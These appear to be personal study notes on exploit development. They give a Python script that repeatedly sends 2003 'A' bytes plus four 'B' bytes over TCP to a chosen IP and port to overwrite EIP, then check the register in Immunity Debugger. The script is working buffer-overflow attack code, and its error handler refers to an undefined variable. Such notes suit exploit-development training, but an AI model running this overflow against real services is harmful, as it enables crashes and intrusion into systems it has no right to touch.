##################################
#####BUFFER###############
#############OVER-FLOW#####################
######Overwriting the EIP#################

1)Create a scrypt to Overwrite the EIP, you can change the original scipt + hardcode IP and port
#!/usr/bin/python3
import sys
import socket
import re
from time import sleep

#Overwrite the EIP, sending 2003 "A" (start of the EIP (2004) in Buffer)
shellcode = "A" * 2003 + "B" * 4

#To allow Both Python2 and 3 reading the input
sys.stdout.write("Enter Target IP => ")
sys.stdout.flush()
ip = sys.stdin.readline()
print("you entered: " + ip)

#Regex IP Format
if not re.match(r'[0-9]+(?:\.[0-9]+){3}', ip):
    print('Invalid IP format')


else:
    port = int(input("Enter Port number here: "))
    cmd_name = input("Enter the wanted cmd to check: ")
    #print(type(cmd_name))

    if port >= 1 and port <= 65535:
        while True:
            try:
                    payload = cmd_name + ' /.:/' + shellcode
                    print(payload)

                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((ip, port))

                    #print("Sending the payload: " + str(len(payload)))
                    s.send((payload.encode()))
            
                    s.close()
            except Exception as e:
                    print(e)
                    print(s.send((payload.encode())))
                    print ("Fuzzing crashed at %s bytes, check the inputs that you have provided" % str(len(buffer_over_the_rainbow)))
                    sys.exit()
    else:
        print("Launch again and Enter a Port number between 1 and 65535: ")

2)In Immunity on the Register view check if the EIP value == 4242424...
    ->If EIP == 42424:
        We control the EIP